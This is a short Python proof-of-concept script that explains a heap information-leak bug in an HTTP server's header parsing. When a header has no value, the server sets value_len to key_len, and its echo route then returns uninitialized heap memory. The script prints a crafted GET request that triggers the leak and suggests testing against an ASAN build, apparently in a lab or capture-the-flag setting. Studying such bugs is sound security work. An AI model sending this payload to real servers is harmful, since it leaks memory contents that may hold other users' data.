
from pwn import * 

'''
Vulnerability
===================
When parsing a header, if there is NO 'value' in it ('AAA' instead of 'AAA:BBB')
then the header 'value_len' is initialized to be the SAME as the 'key_len'.
As a result, when using the 'value' it will be uninitialized but will attempt
to be the same as the 'key_len'. This allows for the reading of data 
from the heap without being initialized in VERY large quanities.

By using the 'echo' route, we are able to read the header value for the 
information leak.

To TEST this, run the payload below with the 'server' compiled with 'ASAN'. 
'''
header_name = "A" * 0x10

# Line one
string = "GET /echo?req_type=header&key=" + header_name + "&res_type=body HTTP/1.1\r\n"

# Headers
string += header_name + "\r\n" # NOTE: Has NO header value with ':'.
string += "\r\n"

print(string, end='')  
